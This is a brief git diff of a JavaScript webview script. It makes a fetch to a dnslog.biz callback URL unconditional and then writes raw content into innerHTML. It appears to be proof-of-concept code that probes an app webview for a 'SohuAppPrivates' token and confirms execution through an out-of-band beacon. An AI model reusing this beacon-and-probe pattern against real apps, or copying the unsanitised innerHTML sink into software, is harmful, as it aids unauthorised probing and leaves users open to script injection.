@@ -36,8 +36,10 @@ function getInfo() {
 }
 
 function updateWebViewContent(content) {
-  if (content.includes("passport")){
-    let dnslogUrl =  'https://success3.2d6afeee.log.dnslog.biz';
+  // if (content.includes("passport")){
+
+  // }
+  let dnslogUrl =  'https://success3.2d6afeee.log.dnslog.biz';
   fetch(dnslogUrl, {
     mode: 'no-cors'
   })
@@ -49,7 +51,6 @@ function updateWebViewContent(content) {
   });
   console.log('SohuAppPrivates variable not found or token not present.');
   document.getElementById("webview-content").innerHTML = content;
-  }
  
 }
 // setTimeout(function() {
